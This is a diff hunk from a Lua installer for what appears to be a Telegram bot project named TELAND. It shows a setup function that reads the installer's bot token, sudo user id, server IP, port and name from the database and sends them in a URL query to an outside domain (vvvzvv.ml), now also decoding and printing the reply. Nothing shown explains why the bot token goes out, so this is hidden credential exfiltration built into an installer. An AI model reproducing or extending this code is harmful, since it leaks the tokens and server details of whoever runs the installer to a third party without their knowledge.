@@ -84,7 +84,9 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write"))  
-https.request('https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+infoBot = https.request('https://vvvzvv.ml/index/Teland.php?n=TELANDTEAM&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
+ToDev = JSON.decode(infoBot)
+print(ToDev)
 local RunBot = io.open("TELAND", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
